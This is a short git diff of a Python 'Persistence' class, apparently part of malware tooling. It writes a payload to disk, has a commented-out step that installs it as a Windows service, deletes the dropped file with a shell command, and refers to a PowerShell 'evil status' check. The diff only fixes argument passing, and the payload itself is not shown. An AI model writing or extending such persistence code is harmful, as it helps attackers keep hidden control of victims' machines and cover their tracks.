@@ -46,13 +46,13 @@ class Persistence():
             self._writePayload(self._absCwd, self._fileName, self._archVersion())
             # TODO 
             # call(f".\\{self._fileName} install {self._serviceName} {self.absCwd}")
-            call(f"del {path}\\{filename}")
+            call(f"del {self._absCwd}\\{self._fileName}")
 
     
     def main(self):
         # print(getoutput(Powershell.Persist.CHECKEVILSTATUS.value))
         # print(Powershell.Persist.CHECKEVILSTATUS.value)
-        self._installService()
+        self._installService(self._absCwd, self._fileName)
 
 if __name__ == "__main__":
     Persistence().main()
